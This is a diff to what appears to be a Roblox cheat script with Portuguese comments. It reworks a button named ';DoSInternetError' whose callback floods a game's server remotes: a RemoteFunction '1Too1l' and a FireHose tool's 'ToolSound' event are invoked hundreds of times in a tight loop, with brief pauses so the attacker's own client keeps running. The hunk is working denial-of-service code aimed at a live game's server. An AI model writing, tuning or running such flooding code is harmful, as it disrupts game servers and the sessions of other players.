@@ -675,43 +675,46 @@ if LocalPlayer.UserId == ID_DONO then
     })
 
     MainTab:CreateButton({
-    Name = ";InternetError",
+    Name = ";DoSInternetError",
     Callback = function()
-        local EnviandoPacotes = true
-        local QuantidadeThreads = 30
-        local LotePorCiclo = 100
-
-        -- Loop para criar as threads
-        for i = 1, QuantidadeThreads do
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local backpack = LocalPlayer:WaitForChild("Backpack")
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE")
+        
+        local toolRemote = remoteStorage:FindFirstChild("1Too1l")
+        
+        if toolRemote and toolRemote:IsA("RemoteFunction") then
+            local args1 = { "PickingTools", "FireHose" }
+            local args2 = { "FireHose", "DestroyFireHose" }
+            
+            -- Reduzido o aninhamento para focar na estabilidade do cliente
             task.spawn(function()
-                local contador = 0
-                -- Certifique-se de que 'LocalPlayer' foi definido no topo do seu script
-                local backpack = LocalPlayer:WaitForChild("Backpack")
-                local args1 = { "PickingTools", "FireHose" }
-                local args2 = { "FireHose", "DestroyFireHose" }
-                
-                while EnviandoPacotes do
-                    contador = contador + 1
-                    
+                for m = 1, 500 do
+                    -- Executa a requisição principal de forma protegida
                     pcall(function()
-                        -- Certifique-se de que 'toolRemote' foi definido no topo do seu script
                         toolRemote:InvokeServer(unpack(args1))
                     end)
                     
-                    pcall(function()
-                        local fireHose = backpack:FindFirstChild("FireHose") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("FireHose"))
-                        if fireHose and fireHose:FindFirstChild("ToolSound") then
-                            fireHose.ToolSound:FireServer(unpack(args2))
+                    -- Verifica e interage com o item sem sobrecarregar a memória
+                    local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose")
+                    if fireHose then
+                        local toolSound = fireHose:FindFirstChild("ToolSound")
+                        if toolSound then
+                            pcall(function()
+                                toolSound:FireServer(unpack(args2))
+                            end)
                         end
-                    end)
+                    end
                     
-                    if contador % LotePorCiclo == 0 then
-                        task.wait() 
+                    -- Uma pausa mínima impede o congelamento do cliente (0 FPS)
+                    -- e ajuda o motor do jogo a despachar os pacotes de rede corretamente
+                    if m % 50 == 0 then
+                        task.wait()
                     end
                 end
-            end) -- Fecha o function do task.spawn
-        end -- Fecha o loop for
-    end, -- Fecha o Callback do botão
+            end)
+        end
+    end,
 })
     
 MainTab:CreateButton({
